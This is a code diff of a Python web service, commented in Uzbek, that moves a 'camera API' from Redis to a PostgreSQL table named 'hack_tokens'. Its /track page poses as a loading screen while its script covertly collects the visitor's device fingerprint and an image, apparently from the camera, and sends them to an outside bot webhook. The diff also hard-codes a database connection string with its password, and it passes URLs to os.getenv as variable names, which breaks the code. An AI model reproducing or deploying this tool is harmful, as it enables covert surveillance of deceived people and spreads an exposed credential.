@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# camera_api.py
+# camera_api_pg.py
 
 import os
 import json
@@ -8,21 +8,40 @@ import base64
 import asyncio
 import aiohttp
 import logging
+from datetime import datetime, timezone
 from io import BytesIO
 from aiohttp import web
-import redis
+import asyncpg
 
 # --------- LOGGING ---------
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # --------- ENV ---------
-WEBHOOK_URL = os.getenv("MAIN_BOT_WEBHOOK_URL", "fit-roanna-runex-7a8db616.koyeb.app/webhook/device-data")
-REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")
+DATABASE_URL = os.getenv("postgresql://postgres:bJYhQjxLLoNAxIYduQuvqOMrhScHycTT@caboose.proxy.rlwy.net:29516/railway")
+MAIN_BOT_WEBHOOK_URL = os.getenv("https://fit-roanna-runex-7a8db616.koyeb.app/")  # asosiy botga yuborish uchun
 PORT = int(os.getenv("PORT", "8000"))
 
-# --------- REDIS ---------
-r = redis.from_url(REDIS_URL)
+if not DATABASE_URL:
+    raise SystemExit("❌ DATABASE_URL kerak!")
+
+# --------- DB POOL ---------
+db_pool = None
+
+async def init_db():
+    global db_pool
+    db_pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=5)
+    # Jadvalni yaratish
+    async with db_pool.acquire() as conn:
+        await conn.execute("""
+            CREATE TABLE IF NOT EXISTS hack_tokens (
+                token TEXT PRIMARY KEY,
+                user_id BIGINT NOT NULL,
+                created_at TIMESTAMPTZ DEFAULT NOW(),
+                used BOOLEAN DEFAULT FALSE
+            )
+        """)
+    logger.info("✅ PostgreSQL ulandi va jadval tayyor.")
 
 # --------- /create_token (Asosiy bot chaqiradi) ---------
 async def create_token(request):
@@ -33,8 +52,11 @@ async def create_token(request):
             return web.json_response({"error": "user_id kerak"}, status=400)
 
         token = str(uuid.uuid4())
-        r.setex(f"camera_token:{token}", 3600, str(user_id))  # 1 soat
-
+        async with db_pool.acquire() as conn:
+            await conn.execute(
+                "INSERT INTO hack_tokens(token, user_id) VALUES($1, $2)",
+                token, user_id
+            )
         return web.json_response({"token": token})
     except Exception as e:
         logger.exception("create_token xato")
@@ -43,41 +65,34 @@ async def create_token(request):
 # --------- /track (Foydalanuvchi ochadi) ---------
 async def track_page(request):
     token = request.query.get("token")
-    if not token or not r.exists(f"camera_token:{token}"):
+    if not token:
+        return web.Response(text="❌ Token kerak", status=400)
+
+    async with db_pool.acquire() as conn:
+        row = await conn.fetchrow("""
+            SELECT user_id FROM hack_tokens
+            WHERE token = $1
+              AND used = FALSE
+              AND created_at > NOW() - INTERVAL '1 hour'
+        """, token)
+
+    if not row:
         return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)
 
+    # HTML sahifa (sizniki kabi)
     html = f"""<!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8" />
-  <title>Yuklanmoqda...</title>
-  <style>
-    body {{
-      font-family: sans-serif;
-      display: flex; flex-direction: column; align-items: center; justify-content: center;
-      height: 100vh; text-align: center;
-      background: #fafafa; color: #333;
-    }}
-    .loader {{
-      width: 40px; height: 40px;
-      border: 4px solid #ddd;
-      border-top: 4px solid #4CAF50;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 20px;
-    }}
-    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
-    .note {{ font-size: 0.9em; color: #777; }}
-  </style>
+<head><meta charset="UTF-8"/><title>Yuklanmoqda...</title>
+<style>body{{font-family:sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;background:#fafafa;color:#333;}}.loader{{width:40px;height:40px;border:4px solid #ddd;border-top:4px solid #4CAF50;border-radius:50%;animation:spin 1s linear infinite;margin:20px;}}@keyframes spin{{to{{transform:rotate(360deg);}}}}.note{{font-size:0.9em;color:#777;}}</style>
 </head>
 <body>
-  <h2>Iltimos, bir necha soniya kuting...</h2>
+  <h2>Iltimos, kuting...</h2>
   <div class="loader"></div>
-  <div class="note">Tajribangizni yaxshilash uchun texnik sozlamalar aniqlanmoqda</div>
+  <div class="note">Ma'lumotlar yig'ilmoqda...</div>
   <script>
     async function collect() {{
       const data = {{
-        timestamp: new Date().toLocaleString(),
+        timestamp: new Date().toISOString(),
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         utcOffset: -new Date().getTimezoneOffset() / 60,
         languages: navigator.languages?.join(', ') || navigator.language,
@@ -87,8 +102,6 @@ async def track_page(request):
         hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
         screen: `${{screen.width}}x${{screen.height}}`,
         viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
-        colorDepth: screen.colorDepth,
-        pixelDepth: screen.pixelDepth,
         deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
         browser: "Noma'lum",
         os: "Noma'lum"
@@ -130,7 +143,7 @@ async def track_page(request):
         body: JSON.stringify(payload)
       }});
 
-      document.body.innerHTML = "<h2>✅ Ma’lumotlar olindi</h2><p class='note'>Rahmat!</p>";
+      document.body.innerHTML = "<h2>✅ Ma’lumotlar olindi</h2>";
     }}
     collect();
   </script>
@@ -138,7 +151,7 @@ async def track_page(request):
 </html>"""
     return web.Response(text=html, content_type="text/html")
 
-# --------- /submit (Ma'lumotni qabul qilish) ---------
+# --------- /submit ---------
 async def submit_data(request):
     try:
         body = await request.json()
@@ -146,10 +159,18 @@ async def submit_data(request):
         client_data = body.get("clientData", {})
         image_data = body.get("image")
 
-        user_id = r.get(f"camera_token:{token}")
-        if not user_id:
-            return web.Response(status=403)
-        user_id = int(user_id)
+        async with db_pool.acquire() as conn:
+            row = await conn.fetchrow("""
+                SELECT user_id FROM hack_tokens
+                WHERE token = $1 AND used = FALSE
+            """, token)
+
+            if not row:
+                return web.Response(status=403)
+
+            user_id = row["user_id"]
+            # Tokenni "bir marta ishlatilsin" deb belgilash
+            await conn.execute("UPDATE hack_tokens SET used = TRUE WHERE token = $1", token)
 
         # Asosiy botga yuborish
         payload = {
@@ -158,19 +179,16 @@ async def submit_data(request):
             "image": image_data
         }
 
-        async with request.app["session"].post(WEBHOOK_URL, json=payload) as resp:
+        async with request.app["session"].post(MAIN_BOT_WEBHOOK_URL, json=payload) as resp:
             if resp.status != 200:
                 logger.warning(f"Webhook failed: {resp.status}")
-
-        # Tokenni o'chirish (bir marta ishlatilsin)
-        r.delete(f"camera_token:{token}")
 
         return web.Response(status=200)
     except Exception as e:
         logger.exception("submit_data xato")
         return web.Response(status=500)
 
-# --------- Web server boshlash ---------
+# --------- Web server ---------
 async def start_web_server():
     app = web.Application()
     app["session"] = aiohttp.ClientSession()
@@ -182,14 +200,15 @@ async def start_web_server():
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
-    logger.info(f"🌐 Camera API ishga tushdi: http://0.0.0.0:{PORT}")
+    logger.info(f"🌐 Camera API (PostgreSQL) ishga tushdi: http://0.0.0.0:{PORT}")
 
 # --------- Main ---------
-def main():
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(start_web_server())
-    loop.run_forever()
+async def main():
+    await init_db()
+    await start_web_server()
+    # Forever ishlash
+    while True:
+        await asyncio.sleep(3600)
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
